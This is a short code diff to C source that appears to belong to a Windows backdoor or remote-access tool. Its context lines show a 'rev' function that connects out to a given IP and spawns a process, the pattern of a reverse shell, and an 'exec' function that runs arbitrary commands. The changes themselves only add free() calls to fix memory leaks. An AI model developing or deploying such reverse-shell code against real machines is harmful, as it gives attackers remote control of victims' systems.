@@ -19,6 +19,7 @@ void rev(char* ip)
 #ifdef DEBUG
 		printf("WSAConnnect Failed");
 #endif
+		free(ip);
 		return;
 	}
 
@@ -33,9 +34,11 @@ void rev(char* ip)
 		printf("CreateProcess failed (%d).\n", GetLastError());
 #endif
 		WaitForInputIdle(pi.hProcess, INFINITE);
+		free(ip);
 		return;
 	}
 	WaitForSingleObject(pi.hProcess, INFINITE);
+	free(ip);
 }
 
 void exec(char* cmd)
@@ -53,11 +56,13 @@ void exec(char* cmd)
 		printf("CreateProcess failed (%d).\n", GetLastError());
 #endif
 		WaitForInputIdle(pi.hProcess, INFINITE);
+		free(cmd);
 		return;
 	}
 
 	WaitForSingleObject(pi.hProcess, INFINITE);
 
+	free(cmd);
 	CloseHandle(pi.hProcess);
 	CloseHandle(pi.hThread);
 }
